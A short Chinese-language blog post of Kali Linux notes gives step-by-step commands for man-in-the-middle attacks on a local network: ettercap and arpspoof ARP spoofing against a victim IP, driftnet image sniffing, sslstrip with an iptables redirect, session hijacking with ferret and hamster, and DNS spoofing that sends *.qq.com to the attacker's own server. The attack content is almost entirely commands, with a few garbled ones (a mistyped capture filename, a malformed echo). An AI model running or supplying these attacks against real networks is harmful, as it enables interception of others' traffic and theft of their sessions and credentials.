---
title: 嗅探，arp欺骗，会话劫持
date: 2016-12-10 20:07:12
tags: 
    - Kali
    - 网络安全
---

<h3>嗅探，arp欺骗，会话劫持</h3>
工具：`Kali Linux` [`ettercap`](http://www.91ri.org/4408.html)
第一次需要配置
```
   /etc/ettercap/etter.conf
   ec_uid = 0
   ec_gid = 0
   [linux]
   if you use iptables 这行，将下面#去掉，打开转发。
```
```
   
   /etc/NetworkManager/NetworkManager.conf 
   [ifupdown]
   managed=true
```

改完后重启NetworkManager

```
   service network-manager restart
```

```
    cat /proc/sys/net/ipv4/ip_forward
    echo 1>>/proc/sys/net/ipv4/ip_forward
```

ettercap 
```
    ettercap -T -M arp /// /// -q -i eth0
```
第一个 `///` 是嗅探目标 --IP地址 <br>
第二个 `///` 是嗅探网络 --网关地址
`eth0` 是网卡编号

driftnet 显示访问图片
```
    driftnet -i eth0
```

arpspoof  (同样需要开启路由转发)
```
    arpspoof -i eth0 -t 被攻击者ip 攻击者ip
```

<h4>数据包捕获</h4>
tcpdump wireshark(图形界面) <br>
```
    tcpdump -i eth0 -w text.txt
```
drafnet

<h4>SSL数据嗅探</h4>
```
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
sslstrip -p -l 10000 -w log.txt
之后开启ARP欺骗工具
用完记得取消 -A -> -D
```

<h4>session劫持-arp欺骗</h4>
```
    arpspoof -i eth0 -t 192.168.14.2 192.168.14.132
    tcpdump -i eth0 -w text.cap
    ferret -r text.cpp
    hamster
    设置代理
    http://hamster
```

<h4>session劫持-DNS欺骗</h4>
```
    使用ettercap进行arp欺骗
    vi /etc/ettercap/etter.dns
    *.qq.com A 183.175.12.144
    //修改dns到自己的服务器
    dns_spoof
```